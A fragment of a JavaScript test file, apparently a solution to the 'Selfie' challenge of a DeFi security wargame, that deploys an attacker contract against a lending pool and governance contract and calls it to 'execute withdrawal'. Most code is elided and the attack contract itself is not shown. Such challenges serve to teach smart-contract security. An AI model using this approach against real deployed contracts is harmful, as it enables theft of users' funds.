...
describe('[Challenge] Selfie', function () {
    ...
    it('Exploit', async function () {
		...
		const AttackerContractFactory = await ethers.getContractFactory('CustomSelfie', attacker);
		
		// poolAddress, governanceAddress, damnValuableTokenAddress
		this.attackerContract = await AttackerContractFactory.deploy(this.pool.address, this.governance.address, this.token.address);
		...
		// execute withdrawal
		await this.attackerContract.connect(attacker).executeAction();
